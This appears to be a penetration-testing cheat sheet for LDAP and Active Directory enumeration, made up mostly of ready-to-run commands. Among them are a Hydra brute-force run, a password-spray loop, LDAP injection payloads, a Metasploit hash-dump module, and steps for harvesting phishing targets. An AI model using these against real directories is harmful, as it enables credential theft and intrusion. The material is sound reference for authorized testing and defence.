# LDAP ENUMERATION (Port 389/636/3268/3269)

## PORT OVERVIEW
```
Port 389  - LDAP (unencrypted)
Port 636  - LDAPS (LDAP over SSL/TLS)
Port 3268 - Global Catalog (AD)
Port 3269 - Global Catalog over SSL (AD)
```

## BANNER GRABBING & VERSION DETECTION
```bash
nmap -sV -p389,636,3268,3269 <IP>               # Service/Version detection
nmap -p389 --script ldap-rootdse <IP>           # LDAP root DSE
nc -nv <IP> 389                                 # Manual connection
```

## ANONYMOUS BIND TESTING
```bash
# Test for anonymous LDAP bind
ldapsearch -x -H ldap://<IP> -b "" -s base      # Anonymous bind
ldapsearch -x -H ldap://<IP> -b "dc=domain,dc=com"  # Query base DN
nmap -p389 --script ldap-search <IP>            # Nmap anonymous search

# If anonymous bind works, enumerate everything
ldapsearch -x -H ldap://<IP> -b "dc=domain,dc=com" "(objectClass=*)"
```

## LDAP ROOTDSE ENUMERATION
```bash
# Extract LDAP root DSE (no auth required)
ldapsearch -x -H ldap://<IP> -s base namingContexts  # Naming contexts
ldapsearch -x -H ldap://<IP> -s base -b "" "*" "+"   # All root DSE attributes
nmap -p389 --script ldap-rootdse <IP>           # Nmap script

# Root DSE reveals:
# - Domain name (defaultNamingContext)
# - Configuration DN
# - Schema DN
# - Forest functionality level
# - Domain Controller name
```

## LDAPSEARCH (BASIC QUERIES)
```bash
# Authenticated LDAP search
ldapsearch -x -H ldap://<IP> -D "CN=user,DC=domain,DC=com" -w password -b "DC=domain,DC=com"

# Search for all objects
ldapsearch -x -H ldap://<IP> -D "CN=user,DC=domain,DC=com" -w password -b "DC=domain,DC=com" "(objectClass=*)"

# Search for users
ldapsearch -x -H ldap://<IP> -D "CN=user,DC=domain,DC=com" -w password -b "DC=domain,DC=com" "(objectClass=user)"

# Search for groups
ldapsearch -x -H ldap://<IP> -D "CN=user,DC=domain,DC=com" -w password -b "DC=domain,DC=com" "(objectClass=group)"

# Search for computers
ldapsearch -x -H ldap://<IP> -D "CN=user,DC=domain,DC=com" -w password -b "DC=domain,DC=com" "(objectClass=computer)"
```

## ENUMERATE USERS
```bash
# Extract all users
ldapsearch -x -H ldap://<IP> -D "CN=user,DC=domain,DC=com" -w password -b "DC=domain,DC=com" "(objectClass=person)" sAMAccountName

# Users with specific attributes
ldapsearch -x -H ldap://<IP> -D "user@domain.com" -w password -b "DC=domain,DC=com" "(objectClass=user)" sAMAccountName mail userPrincipalName

# Find admin users
ldapsearch -x -H ldap://<IP> -D "user@domain.com" -w password -b "DC=domain,DC=com" "(memberOf=CN=Domain Admins,CN=Users,DC=domain,DC=com)"

# Users with SPN (Kerberoastable)
ldapsearch -x -H ldap://<IP> -D "user@domain.com" -w password -b "DC=domain,DC=com" "(&(objectClass=user)(servicePrincipalName=*))" sAMAccountName servicePrincipalName

# Users without Kerberos pre-auth (AS-REP roastable)
ldapsearch -x -H ldap://<IP> -D "user@domain.com" -w password -b "DC=domain,DC=com" "(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))" sAMAccountName
```

## ENUMERATE GROUPS
```bash
# All groups
ldapsearch -x -H ldap://<IP> -D "user@domain.com" -w password -b "DC=domain,DC=com" "(objectClass=group)" cn member

# Specific groups
ldapsearch -x -H ldap://<IP> -D "user@domain.com" -w password -b "DC=domain,DC=com" "(cn=Domain Admins)" member

# Group membership
ldapsearch -x -H ldap://<IP> -D "user@domain.com" -w password -b "DC=domain,DC=com" "(memberOf=CN=Domain Admins,CN=Users,DC=domain,DC=com)" sAMAccountName
```

## ENUMERATE COMPUTERS
```bash
# All computers
ldapsearch -x -H ldap://<IP> -D "user@domain.com" -w password -b "DC=domain,DC=com" "(objectClass=computer)" dNSHostName operatingSystem

# Domain Controllers
ldapsearch -x -H ldap://<IP> -D "user@domain.com" -w password -b "DC=domain,DC=com" "(&(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=8192))" dNSHostName

# Computers with unconstrained delegation
ldapsearch -x -H ldap://<IP> -D "user@domain.com" -w password -b "DC=domain,DC=com" "(&(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=524288))" dNSHostName
```

## WINDAPSEARCH (ACTIVE DIRECTORY ENUMERATION)
```bash
# windapsearch - Python tool for AD enumeration via LDAP
windapsearch -d <domain> --dc <DC_IP> -u <user> -p <password> --users  # Enumerate users
windapsearch -d <domain> --dc <DC_IP> -u <user> -p <password> --groups  # Enumerate groups
windapsearch -d <domain> --dc <DC_IP> -u <user> -p <password> --computers  # Enumerate computers
windapsearch -d <domain> --dc <DC_IP> -u <user> -p <password> --privileged-users  # Privileged users
windapsearch -d <domain> --dc <DC_IP> -u <user> -p <password> --da  # Domain Admins
windapsearch -d <domain> --dc <DC_IP> -u <user> -p <password> --gpos  # Group Policy Objects
```

## LDAPDOMAINDUMP
```bash
# Dump entire domain via LDAP
ldapdomaindump -u 'DOMAIN\user' -p password <DC_IP>  # Dump to HTML/JSON/grep
ldapdomaindump -u 'DOMAIN\user' -p password <DC_IP> -o output/  # Specify output dir

# Generates files:
# - domain_users.html/json/grep
# - domain_groups.html/json/grep
# - domain_computers.html/json/grep
# - domain_policy.html/json/grep
# - domain_trusts.html/json/grep
```

## NMAP LDAP SCRIPTS
```bash
nmap --script "ldap-*" -p389 <IP>               # All LDAP scripts
nmap --script ldap-rootdse -p389 <IP>           # Root DSE
nmap --script ldap-search -p389 <IP>            # Anonymous search
nmap --script ldap-brute -p389 <IP>             # Brute force
nmap --script ldap-brute --script-args ldap.base="dc=domain,dc=com" -p389 <IP>
```

## LDAPS (LDAP OVER SSL/TLS)
```bash
# Connect to LDAPS (port 636)
ldapsearch -x -H ldaps://<IP>:636 -b "DC=domain,DC=com"

# StartTLS on port 389
ldapsearch -x -H ldap://<IP> -Z -b "DC=domain,DC=com"  # Attempt StartTLS

# Test SSL/TLS configuration
nmap --script ssl-enum-ciphers -p636 <IP>
sslscan <IP>:636
testssl.sh <IP>:636
```

## PASSWORD ATTACKS
```bash
# LDAP brute force
nmap --script ldap-brute -p389 <IP>
nmap --script ldap-brute --script-args userdb=users.txt,passdb=pass.txt -p389 <IP>

# Hydra
hydra -L users.txt -P passwords.txt ldap://<IP>  # Brute force
hydra -l "CN=user,DC=domain,DC=com" -P passwords.txt ldap://<IP>

# Password spray (avoid lockout)
for user in $(cat users.txt); do
  ldapwhoami -x -H ldap://<IP> -D "$user@domain.com" -w 'Password123!' 2>&1 | grep -i "success"
  sleep 1
done
```

## ATTRIBUTE EXTRACTION
```bash
# Extract specific attributes
ldapsearch -x -H ldap://<IP> -D "user@domain.com" -w password -b "DC=domain,DC=com" "(objectClass=user)" \
  sAMAccountName mail userPrincipalName memberOf description

# Description field (often contains passwords!)
ldapsearch -x -H ldap://<IP> -D "user@domain.com" -w password -b "DC=domain,DC=com" "(objectClass=user)" description | grep -i "pass"

# Home directories (UNC paths)
ldapsearch -x -H ldap://<IP> -D "user@domain.com" -w password -b "DC=domain,DC=com" "(objectClass=user)" homeDirectory

# User scripts (logon scripts)
ldapsearch -x -H ldap://<IP> -D "user@domain.com" -w password -b "DC=domain,DC=com" "(objectClass=user)" scriptPath
```

## TRUST ENUMERATION
```bash
# Enumerate domain trusts
ldapsearch -x -H ldap://<IP> -D "user@domain.com" -w password -b "CN=System,DC=domain,DC=com" "(objectClass=trustedDomain)" trustPartner

# Forest trusts
ldapsearch -x -H ldap://<IP> -D "user@domain.com" -w password -b "CN=Configuration,DC=domain,DC=com" "(objectClass=crossRef)"
```

## GPO ENUMERATION
```bash
# Enumerate Group Policy Objects
ldapsearch -x -H ldap://<IP> -D "user@domain.com" -w password -b "CN=Policies,CN=System,DC=domain,DC=com" "(objectClass=groupPolicyContainer)" displayName gPCFileSysPath
```

## LDAP INJECTION TESTING
```bash
# Test for LDAP injection in web apps
# LDAP queries in apps might be injectable

# LDAP injection payloads
*
admin*
*)(objectClass=*
)(cn=*))(|(cn=*

# Example vulnerable query:
# (&(uid=$username)(password=$password))

# Injection: username=admin*)(|(password=*)
# Results in: (&(uid=admin*)(|(password=*))(password=something))
```

## METASPLOIT LDAP MODULES
```bash
msfconsole
use auxiliary/gather/ldap_query                 # LDAP queries
use auxiliary/scanner/ldap/ldap_login           # LDAP login scanner
use auxiliary/gather/ldap_hashdump              # Dump LDAP hashes
```

## COMMON MISCONFIGURATIONS
```
☐ Anonymous LDAP bind enabled
☐ LDAP accessible from internet
☐ No SSL/TLS (credentials transmitted in clear)
☐ Weak/default credentials
☐ Sensitive data in description fields
☐ User attributes world-readable
☐ No account lockout policy (brute force possible)
☐ LDAP injection vulnerabilities in apps
☐ Excessive permissions for low-privileged users
☐ Password in user attributes (userPassword field)
```

## QUICK WIN CHECKLIST
```
☐ Test for anonymous LDAP bind
☐ Extract root DSE (domain name, DCs)
☐ Enumerate users (sAMAccountName, email)
☐ Search description fields for passwords
☐ Find users with SPNs (Kerberoasting)
☐ Find users without pre-auth (AS-REP roasting)
☐ Enumerate Domain Admins
☐ Find computers with unconstrained delegation
☐ Extract group memberships
☐ Test for LDAP injection (web apps)
☐ Check for LDAPS/StartTLS
☐ Enumerate GPOs
```

## ONE-LINER FULL ENUMERATION
```bash
# Quick LDAP enumeration (anonymous)
nmap -p389 --script ldap-rootdse,ldap-search <IP> && \
ldapsearch -x -H ldap://<IP> -b "" -s base namingContexts

# With credentials
ldapdomaindump -u 'DOMAIN\user' -p password <DC_IP> && \
windapsearch -d DOMAIN --dc <DC_IP> -u user -p password --users --groups --computers --privileged-users
```

## ADVANCED TECHNIQUES
```bash
# Extract AD schema
ldapsearch -x -H ldap://<IP> -D "user@domain.com" -w password -b "CN=Schema,CN=Configuration,DC=domain,DC=com" "(objectClass=classSchema)"

# LDAP referral chasing (follow referrals to other DCs)
ldapsearch -x -H ldap://<IP> -C -b "DC=domain,DC=com" "(objectClass=*)"

# LDAP paging (retrieve large result sets)
ldapsearch -x -H ldap://<IP> -D "user@domain.com" -w password -b "DC=domain,DC=com" -E pr=1000/noprompt "(objectClass=*)"
```

## POST-EXPLOITATION (AFTER LDAP ACCESS)
```bash
# After gaining LDAP access:
1. Enumerate all domain users, groups, computers
2. Find Domain Admins and privileged users
3. Extract description fields (look for passwords)
4. Identify Kerberoasting targets (SPNs)
5. Identify AS-REP roasting targets (no pre-auth)
6. Map domain trusts
7. Enumerate GPOs (potential privilege escalation)
8. Find delegation misconfigurations
9. Build target list for lateral movement
10. Extract email addresses for phishing

# Full user dump with all attributes
ldapsearch -x -H ldap://<IP> -D "user@domain.com" -w password -b "DC=domain,DC=com" "(objectClass=user)" "*" > all_users.txt
```
